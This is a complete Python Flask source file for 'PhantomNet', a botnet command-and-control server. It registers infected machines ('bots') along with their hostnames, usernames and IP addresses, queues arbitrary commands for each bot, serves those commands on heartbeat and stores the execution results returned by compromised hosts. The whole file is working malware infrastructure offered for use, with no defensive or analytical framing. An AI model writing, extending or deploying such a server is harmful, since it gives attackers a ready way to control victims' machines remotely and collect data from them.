#!/usr/bin/env python3
"""
PhantomNet C2 Server - Flask Version
Command and control server with basic functionality
"""

import sqlite3
import json
import base64
import hashlib
import secrets
import time
import random
import string
import logging
import os
from datetime import datetime, timedelta
from typing import Dict, List, Optional
from flask import Flask, request, jsonify
from flask_cors import CORS

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('phantom.log'),
        logging.StreamHandler()
    ]
)

app = Flask(__name__)
CORS(app)

class Bot:
    def __init__(self, bot_id: str, ip: str, hostname: str, os: str, username: str):
        self.id = bot_id
        self.ip = ip
        self.hostname = hostname
        self.os = os
        self.username = username
        self.last_seen = datetime.now()
        self.status = 'active'
        self.session_token = secrets.token_urlsafe(32)
        self.encryption_key = secrets.token_urlsafe(32)

class Command:
    def __init__(self, command_id: str, bot_id: str, command: str, args: List[str] = None):
        self.id = command_id
        self.bot_id = bot_id
        self.command = command
        self.args = args or []
        self.timestamp = datetime.now()
        self.status = 'pending'
        self.result = None

class PhantomC2Server:
    def __init__(self):
        self.bots: Dict[str, Bot] = {}
        self.commands: Dict[str, Command] = {}
        
        # Initialize database
        self.init_database()
        
    def init_database(self):
        """Initialize SQLite database"""
        conn = sqlite3.connect('phantom.db')
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS bots (
                id TEXT PRIMARY KEY,
                ip TEXT,
                hostname TEXT,
                os TEXT,
                username TEXT,
                last_seen TIMESTAMP,
                status TEXT,
                session_token TEXT,
                encryption_key TEXT
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id TEXT PRIMARY KEY,
                bot_id TEXT,
                command TEXT,
                args TEXT,
                timestamp TIMESTAMP,
                status TEXT,
                result TEXT,
                FOREIGN KEY (bot_id) REFERENCES bots (id)
            )
        ''')
        
        conn.commit()
        conn.close()
    
    def save_bot_to_db(self, bot: Bot):
        """Save bot to database"""
        conn = sqlite3.connect('phantom.db')
        cursor = conn.cursor()
        cursor.execute('''
            INSERT OR REPLACE INTO bots 
            (id, ip, hostname, os, username, last_seen, status, session_token, encryption_key)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            bot.id, bot.ip, bot.hostname, bot.os, bot.username, 
            bot.last_seen, bot.status, bot.session_token, bot.encryption_key
        ))
        conn.commit()
        conn.close()
    
    def verify_session_token(self, token: str) -> Optional[str]:
        """Verify session token and return bot_id if valid"""
        for bot_id, bot in self.bots.items():
            if bot.session_token == token:
                return bot_id
        return None
    
    def get_pending_commands(self, bot_id: str) -> List[Command]:
        """Get pending commands for bot"""
        conn = sqlite3.connect('phantom.db')
        cursor = conn.cursor()
        cursor.execute(
            'SELECT id, command, args FROM commands WHERE bot_id = ? AND status = "pending"',
            (bot_id,)
        )
        
        commands = []
        for row in cursor.fetchall():
            cmd = Command(
                command_id=row[0],
                bot_id=bot_id,
                command=row[1],
                args=json.loads(row[2]) if row[2] else []
            )
            commands.append(cmd)
        
        conn.close()
        return commands
    
    def update_command_result(self, command_id: str, result: str, status: str):
        """Update command result in database"""
        conn = sqlite3.connect('phantom.db')
        cursor = conn.cursor()
        cursor.execute(
            'UPDATE commands SET result = ?, status = ? WHERE id = ?',
            (result, status, command_id)
        )
        conn.commit()
        conn.close()
    
    def add_command(self, bot_id: str, command: str, args: List[str] = None) -> str:
        """Add new command to bot"""
        if args is None:
            args = []
        
        command_id = secrets.token_urlsafe(16)
        cmd = Command(command_id, bot_id, command, args)
        
        # Save to database
        conn = sqlite3.connect('phantom.db')
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO commands (id, bot_id, command, args, timestamp, status, result)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (
            command_id, bot_id, command, json.dumps(args), 
            cmd.timestamp, cmd.status, cmd.result
        ))
        conn.commit()
        conn.close()
        
        self.commands[command_id] = cmd
        return command_id

# Create server instance
server = PhantomC2Server()

@app.route('/register', methods=['POST'])
def handle_bot_register():
    """Handle bot registration"""
    try:
        data = request.get_json()
        
        bot_id = data.get('bot_id', f"PHANTOM_{secrets.token_urlsafe(8).upper()}")
        bot_info = data.get('bot_info', {})
        
        # Create new bot instance
        bot = Bot(
            bot_id=bot_id,
            ip=request.remote_addr,
            hostname=bot_info.get('hostname', 'Unknown'),
            os=bot_info.get('os', 'Unknown'),
            username=bot_info.get('username', 'Unknown')
        )
        
        # Save to database
        server.save_bot_to_db(bot)
        server.bots[bot_id] = bot
        
        # Return session token and encryption key
        response_data = {
            'session_token': bot.session_token,
            'encryption_key': bot.encryption_key,
            'status': 'registered'
        }
        
        logging.info(f"Bot registered: {bot_id} from {request.remote_addr}")
        return jsonify(response_data)
        
    except Exception as e:
        logging.error(f"Bot registration error: {e}")
        return jsonify({'error': 'Registration failed'}), 500

@app.route('/heartbeat', methods=['POST'])
def handle_bot_heartbeat():
    """Handle bot heartbeat with command retrieval"""
    try:
        data = request.get_json()
        session_token = data.get('session_token')
        
        bot_id = server.verify_session_token(session_token)
        if not bot_id:
            return jsonify({'error': 'Invalid session token'}), 401
        
        # Update bot status
        if bot_id in server.bots:
            server.bots[bot_id].last_seen = datetime.now()
            server.bots[bot_id].status = 'active'
        
        # Get pending commands
        commands = server.get_pending_commands(bot_id)
        
        # Format commands for response
        command_list = []
        for cmd in commands:
            command_list.append({
                'id': cmd.id,
                'command': cmd.command,
                'args': cmd.args
            })
        
        response_data = {
            'commands': command_list,
            'status': 'active'
        }
        
        return jsonify(response_data)
        
    except Exception as e:
        logging.error(f"Heartbeat error: {e}")
        return jsonify({'error': 'Heartbeat failed'}), 500

@app.route('/result', methods=['POST'])
def handle_command_result():
    """Handle command execution results"""
    try:
        data = request.get_json()
        session_token = data.get('session_token')
        
        bot_id = server.verify_session_token(session_token)
        if not bot_id:
            return jsonify({'error': 'Invalid session token'}), 401
        
        command_id = data.get('command_id')
        result = data.get('result', '')
        status = data.get('status', 'completed')
        
        # Update command in database
        server.update_command_result(command_id, result, status)
        
        logging.info(f"Command result received: {command_id} from {bot_id}")
        return jsonify({'status': 'received'})
        
    except Exception as e:
        logging.error(f"Command result error: {e}")
        return jsonify({'error': 'Result processing failed'}), 500

@app.route('/status', methods=['GET'])
def get_server_status():
    """Get server status and statistics"""
    try:
        stats = {
            'total_bots': len(server.bots),
            'active_bots': len([b for b in server.bots.values() if b.status == 'active']),
            'total_commands': len(server.commands),
            'server_status': 'running',
            'timestamp': datetime.now().isoformat()
        }
        return jsonify(stats)
    except Exception as e:
        logging.error(f"Status error: {e}")
        return jsonify({'error': 'Status check failed'}), 500

if __name__ == '__main__':
    logging.info("PhantomNet C2 Server starting on 0.0.0.0:8443")
    app.run(host='0.0.0.0', port=8443, debug=False)
